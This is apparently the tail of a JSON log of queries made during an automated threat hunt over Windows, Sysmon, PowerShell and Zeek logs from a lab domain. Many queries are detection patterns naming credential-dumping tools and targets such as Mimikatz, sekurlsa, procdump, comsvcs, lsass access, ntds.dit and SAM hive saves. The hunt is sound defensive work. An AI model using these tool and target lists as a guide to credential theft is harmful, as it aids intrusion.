+      "phase": "investigate step 2",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND host.name:scranton.dmevals.local AND (process.executable:*PowerShell* OR process.executable:*powershell*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "process.executable",
+          "process.command_line",
+          "process.parent.executable",
+          "user.name"
+        ],
+        "size": 30,
+        "sort": "asc"
+      },
+      "hits": 11,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-266a7a4654",
+      "phase": "investigate step 2",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:4688 AND (process.command_line:*lsass* OR process.command_line:*Invoke-Mimikatz* OR process.command_line:*DumpCreds* OR process.command_line:*sekurlsa* OR process.command_line:*procdump*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "process.executable",
+          "process.command_line",
+          "win.ParentProcessName",
+          "user.name"
+        ],
+        "size": 30,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-fc0ab32eab",
+      "phase": "investigate step 2",
+      "tool": "esql",
+      "args": {
+        "query": "FROM logs-windows.sysmon-default METADATA _id, _index | WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" AND TO_LOWER(win.SourceImage) LIKE \"%powershell%\" | KEEP @timestamp, host.name, win.SourceImage, win.GrantedAccess, win.CallTrace, win.SourceProcessId, _id, _index"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-943ad46667",
+      "phase": "investigate step 3",
+      "tool": "esql",
+      "args": {
+        "query": "FROM logs-windows.powershell-default METADATA _id, _index | WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" | KEEP @timestamp, host.name, user.name, powershell.script_block_text, win.ScriptBlockId, _id, _index"
+      },
+      "hits": 146,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-6549397b97",
+      "phase": "investigate step 3",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.powershell",
+        "query": "powershell.script_block_text:(*Mini* OR *Katz* OR *nanodump* OR *SafetyKatz* OR *lsass* OR *SAM* OR *dump*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "event.code",
+          "powershell.script_block_text",
+          "user.name"
+        ],
+        "size": 30,
+        "sort": "asc"
+      },
+      "hits": 6,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-790cb17ee9",
+      "phase": "investigate step 4",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.powershell-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1bzydoz"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-b2c1ad2d88",
+      "phase": "investigate step 4",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.powershell-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1bzyNfQ"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": [
+        "F01"
+      ]
+    },
+    {
+      "query_id": "q-6f00616213",
+      "phase": "investigate step 4",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1RrM7IJ"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": [
+        "F02"
+      ]
+    },
+    {
+      "query_id": "q-4e7173051d",
+      "phase": "investigate step 4",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:4688 AND (process.command_line:*reg\\ save* OR process.command_line:*ntds* OR process.command_line:*vssadmin* OR process.command_line:*esentutl* OR process.command_line:*comsvcs* OR process.command_line:*SAM* OR process.command_line:*SECURITY*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "process.executable",
+          "process.command_line",
+          "win.ParentProcessName",
+          "user.name"
+        ],
+        "size": 30,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-5a8e35cccb",
+      "phase": "investigate step 5",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:13 AND win.TargetObject:*Policy\\\\Secrets*",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "process.executable",
+          "win.TargetObject",
+          "win.Details",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-450d96ca89",
+      "phase": "investigate step 5",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:11 AND (win.TargetFilename:*.dmp OR win.TargetFilename:*lsass* OR win.TargetFilename:*SAM* OR win.TargetFilename:*.kirbi OR win.TargetFilename:*.zip OR win.TargetFilename:*.7z)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "process.executable",
+          "win.TargetFilename",
+          "user.name"
+        ],
+        "size": 40,
+        "sort": "asc"
+      },
+      "hits": 8,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-bc2b5e3ddd",
+      "phase": "investigate step 5",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "windows.security",
+        "field": "process.executable",
+        "query": "event.code:4688",
+        "time_from": null,
+        "time_to": null,
+        "size": 40,
+        "sub_field": null
+      },
+      "hits": 460,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-61fa0be03b",
+      "phase": "investigate step 5",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:8",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "win.SourceImage",
+          "win.TargetImage",
+          "win.StartAddress",
+          "win.StartModule",
+          "process.executable"
+        ],
+        "size": 25,
+        "sort": "asc"
+      },
+      "hits": 95,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-5667fee559",
+      "phase": "investigate step 6",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.powershell",
+        "query": "event.code:4104 AND host.name:scranton.dmevals.local",
+        "time_from": "2020-05-02T02:57:00.000Z",
+        "time_to": "2020-05-02T03:07:00.000Z",
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "user.name",
+          "powershell.script_block_text",
+          "win.ScriptBlockId"
+        ],
+        "size": 30,
+        "sort": "asc"
+      },
+      "hits": 80,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-ec6d66c30d",
+      "phase": "investigate step 6",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "zeek",
+        "field": "zeek.operation",
+        "query": "event.action:dce_rpc",
+        "time_from": null,
+        "time_to": null,
+        "size": 30,
+        "sub_field": null
+      },
+      "hits": 123,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-0d2a479edc",
+      "phase": "investigate step 6",
+      "tool": "search",
+      "args": {
+        "dataset": "zeek",
+        "query": "zeek.operation:(*DRS* OR *drsuapi* OR *Drsuapi*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "observer.name",
+          "source.ip",
+          "destination.ip",
+          "zeek.operation",
+          "zeek.endpoint",
+          "zeek.named_pipe",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 9,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-56cf64769d",
+      "phase": "investigate step 6",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.other",
+        "query": "event.code:(7045 OR 7040 OR 5857 OR 5858 OR 2004 OR 2006)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "event.code",
+          "win.ServiceName",
+          "win.ImagePath",
+          "win.ServiceType",
+          "win.param1",
+          "win.param2",
+          "message"
+        ],
+        "size": 25,
+        "sort": "asc"
+      },
+      "hits": 102,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-8957457cdc",
+      "phase": "investigate step 7",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND host.name:scranton.dmevals.local AND process.pid:2976",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "process.executable",
+          "process.command_line",
+          "process.parent.executable",
+          "process.parent.command_line",
+          "user.name",
+          "win.ProcessGuid"
+        ],
+        "size": 10,
+        "sort": "asc"
+      },
+      "hits": 1,
+      "error": null,
+      "cited_by": [
+        "F01"
+      ]
+    },
+    {
+      "query_id": "q-9689874317",
+      "phase": "investigate step 7",
+      "tool": "count",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:4662 OR event.code:4768 OR event.code:4648",
+        "time_from": null,
+        "time_to": null
+      },
+      "hits": 36,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-b70b9ec093",
+      "phase": "investigate step 7",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:13 AND (win.TargetObject:*SECURITY\\\\Cache* OR win.TargetObject:*SECURITY\\\\Policy* OR win.TargetObject:*SECURITY\\\\Secrets*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "process.executable",
+          "win.TargetObject",
+          "win.Details"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 5,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-3c765ade11",
+      "phase": "investigate step 7",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:11 AND (win.TargetFilename:*ntds.dit* OR win.TargetFilename:*config\\\\SAM* OR win.TargetFilename:*config\\\\SECURITY* OR win.TargetFilename:*config\\\\SYSTEM* OR win.TargetFilename:*\\\\Temp\\\\*.tmp)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "process.executable",
+          "win.TargetFilename",
+          "user.name"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 18,
+      "error": null,
+      "cited_by": [
+        "F01"
+      ]
+    },
+    {
+      "query_id": "q-e6cfba11bd",
+      "phase": "investigate step 8",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.other",
+        "query": "event.code:(7045 OR 1074 OR 6005 OR 6006 OR 6008 OR 7031 OR 7034)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "event.code",
+          "win.ServiceName",
+          "win.ImagePath",
+          "win.ServiceType",
+          "user.name",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 8,
+      "error": null,
+      "cited_by": [
+        "F03"
+      ]
+    },
+    {
+      "query_id": "q-0b80dc8674",
+      "phase": "investigate step 8",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND host.name:nashua.dmevals.local AND (process.executable:*python* OR process.executable:*wsmprovhost* OR process.executable:*psexesvc* OR process.executable:*rar* OR process.executable:*sdelete*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "process.executable",
+          "process.command_line",
+          "process.parent.executable",
+          "user.name"
+        ],
+        "size": 25,
+        "sort": "asc"
+      },
+      "hits": 9,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-325ff08291",
+      "phase": "investigate step 8",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:4661",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "win.ObjectType",
+          "win.ObjectName",
+          "win.ProcessName",
+          "win.SubjectUserName",
+          "win.AccessMask",
+          "win.PrivilegeList"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 37,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-5aaadae8fc",
+      "phase": "investigate step 8",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND host.name:scranton.dmevals.local",
+        "time_from": "2020-05-02T03:04:00.000Z",
+        "time_to": "2020-05-02T03:07:00.000Z",
+        "fields": [
+          "@timestamp",
+          "process.executable",
+          "process.command_line",
+          "process.parent.executable",
+          "user.name"
+        ],
+        "size": 30,
+        "sort": "@timestamp:desc"
+      },
+      "hits": 19,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-f4c29ad6db",
+      "phase": "investigate step 9",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1R-k13z"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": [
+        "F01"
+      ]
+    },
+    {
+      "query_id": "q-cc10f528bf",
+      "phase": "investigate step 9",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:8 AND host.name:nashua.dmevals.local",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "win.SourceImage",
+          "win.TargetImage",
+          "win.StartAddress",
+          "win.StartModule",
+          "win.SourceProcessId",
+          "win.TargetProcessId"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-f9bdbc4c13",
+      "phase": "investigate step 9",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.powershell",
+        "query": "event.code:4104 AND host.name:nashua.dmevals.local",
+        "time_from": "2020-05-02T03:05:00.000Z",
+        "time_to": "2020-05-02T03:18:00.000Z",
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "user.name",
+          "powershell.script_block_text"
+        ],
+        "size": 40,
+        "sort": "asc"
+      },
+      "hits": 11,
+      "error": null,
+      "cited_by": [
+        "F02"
+      ]
+    },
+    {
+      "query_id": "q-e5b4473e8e",
+      "phase": "investigate step 9",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:10 AND win.TargetImage:*lsass* AND win.GrantedAccess:0x1400",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "win.SourceImage",
+          "win.GrantedAccess",
+          "win.SourceProcessId"
+        ],
+        "size": 25,
+        "sort": "asc"
+      },
+      "hits": 24,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-3db073d6da",
+      "phase": "investigate step 10",
+      "tool": "esql",
+      "args": {
+        "query": "FROM logs-windows.powershell-default METADATA _id, _index | WHERE TO_LOWER(COALESCE(powershell.script_block_text, \"\")) LIKE \"*mimikatz*\" OR TO_LOWER(COALESCE(powershell.script_block_text, \"\")) LIKE \"*minidump*\" OR TO_LOWER(COALESCE(powershell.script_block_text, \"\")) LIKE \"*sekurlsa*\" OR TO_LOWER(COALESCE(powershell.script_block_text, \"\")) LIKE \"*lsass*\" OR TO_LOWER(COALESCE(powershell.script_block_text, \"\")) LIKE \"*dmp*\" | KEEP @timestamp, host.name, user.name, powershell.script_block_text, _id, _index"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-d9407c1441",
+      "phase": "investigate step 10",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:11 AND host.name:scranton.dmevals.local",
+        "time_from": "2020-05-02T03:04:30.000Z",
+        "time_to": "2020-05-02T03:06:30.000Z",
+        "fields": [
+          "@timestamp",
+          "process.executable",
+          "win.TargetFilename",
+          "user.name"
+        ],
+        "size": 40,
+        "sort": "asc"
+      },
+      "hits": 47,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-4917a7f783",
+      "phase": "investigate step 10",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:(10 OR 8) AND win.SourceImage:*wsmprovhost*",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "win.SourceImage",
+          "win.TargetImage",
+          "win.GrantedAccess",
+          "win.StartModule",
+          "win.StartAddress"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 120,
+      "error": null,
+      "cited_by": [
+        "F02"
+      ]
+    },
+    {
+      "query_id": "q-aa37985c0c",
+      "phase": "investigate step 11",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:(4656 OR 4663) AND win.ObjectType:Process AND win.ObjectName:*lsass*",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "win.ProcessName",
+          "win.SubjectUserName",
+          "win.ObjectName",
+          "win.AccessMask",
+          "win.ObjectType"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 19,
+      "error": null,
+      "cited_by": [
+        "F01"
+      ]
+    },
+    {
+      "query_id": "q-1783e27ee1",
+      "phase": "investigate step 11",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "windows.security",
+        "field": "win.ObjectName",
+        "query": "event.code:4656 AND win.ObjectType:Process",
+        "time_from": null,
+        "time_to": null,
+        "size": 15,
+        "sub_field": null
+      },
+      "hits": 13,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-3ad7d08e52",
+      "phase": "investigate step 12",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "windows.security",
+        "field": "event.code",
+        "query": "event.code:4662 OR event.code:4768 OR event.code:4648",
+        "time_from": null,
+        "time_to": null,
+        "size": 10,
+        "sub_field": null
+      },
+      "hits": 36,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-61e91202bd",
+      "phase": "investigate step 12",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:(4662 OR 4768 OR 4648)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "event.code",
+          "win.TargetUserName",
+          "win.ServiceName",
+          "win.SubjectUserName",
+          "win.Properties",
+          "win.IpAddress",
+          "win.TicketEncryptionType",
+          "win.AccessMask"
+        ],
+        "size": 40,
+        "sort": "asc"
+      },
+      "hits": 36,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-8a15998c3f",
+      "phase": "investigate step 13",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "win.TargetFilename:(*passw* OR *credential* OR *secrets*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "event.code",
+          "process.executable",
+          "win.TargetFilename",
+          "user.name"
+        ],
+        "size": 30,
+        "sort": "asc"
+      },
+      "hits": 5,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-0a17ecdf5e",
+      "phase": "investigate step 13",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND host.name:scranton.dmevals.local AND process.executable:(*accesschk* OR *procdump* OR *SharpHound* OR *csc.exe*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "process.executable",
+          "process.command_line",
+          "process.parent.executable",
+          "user.name"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 2,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-60f545b93d",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1R-k13z"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-9318c391b3",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1R-k13z"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-c104dfc412",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1R-k13z"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-a2d4b7f6db",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1R-k13y"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-b8edcc868d",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1R-k131"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-e2c8f655b9",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YldM_p"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-a20fd81606",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YldM_i"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-d15882b7ec",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1WdFNhN"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-5522c6c90e",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1WdEtgZ"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-ffdbc1831e",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.powershell-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1bzyNfQ"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-7b37a226e4",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1RrM7IJ"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-f90d693aaa",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1RrM7IJ"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-d0265082ff",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1RsM6Q6"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-ae683dad73",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.powershell-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1bsxh3J"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-67e3bc1e1a",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1NY3HhA"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-42aa5dbe02",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+        "id": "AaFFkNQ25mySA1NY3HhA"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-f08ca7aec4",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.other-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1aOnx2d"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-215a667dc6",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YhYtYv"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-80c27abc6e",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+        "id": "AaFFkdQ25mySA1YhYtYv"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-1e2b8c4463",
+      "phase": "verify",
+      "tool": "get_event",
+      "args": {
+        "index": ".ds-logs-zeek-default-2026.10.16-000001",
+        "id": "AaFFktQ25mySA1aO8Idf"
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    }
+  ]
+}
